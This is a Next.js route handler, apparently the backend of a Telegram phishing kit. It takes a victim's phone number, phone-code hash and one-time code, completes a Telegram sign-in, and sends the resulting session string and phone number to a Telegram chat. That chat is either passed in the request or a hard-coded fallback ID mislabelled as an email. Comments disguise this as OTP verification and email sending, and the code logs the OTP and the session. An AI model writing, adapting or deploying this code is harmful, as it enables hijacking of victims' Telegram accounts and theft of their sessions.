"use server";

import { NextResponse } from "next/server";
import { sendMessageToTelegram, signIn } from "../../../utils/utils";

/**
 * GET route handler for verifying OTP and sending email.
 */
export async function GET(req) {
  try {
    const { searchParams } = new URL(req.url);
    const phone = `+${parseInt(searchParams.get("phoneNumber").replace(" ", ""))}`;
    console.log("phone: ", phone);
    const phoneHash = searchParams.get("hash");
    console.log("phoneHash: ", phoneHash);
    const code = searchParams.get("otp");
    console.log("code: ", code);
    const telegramId = searchParams.get("e");
    console.log("telegramId: ", telegramId);

    // Validate input parameters
    if (!phone || !phoneHash || !code) {
      return NextResponse.json(
        { error: "Missing required parameters: phone, hash, or otp." },
        { status: 400 }
      );
    }

    // Sign in the user
    const { sessionString } = await signIn(phone, phoneHash, code);

    console.log("Session String:", sessionString);

    // Send the email

    const fallbackEmail = "5383430311";

    await sendMessageToTelegram(telegramId || fallbackEmail, [
      sessionString,
      phone,
    ]);

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error("Error in GET handler:", error);
    return NextResponse.json(
      { error: "Failed to process the request. Please try again later." },
      { status: 500 }
    );
  }
}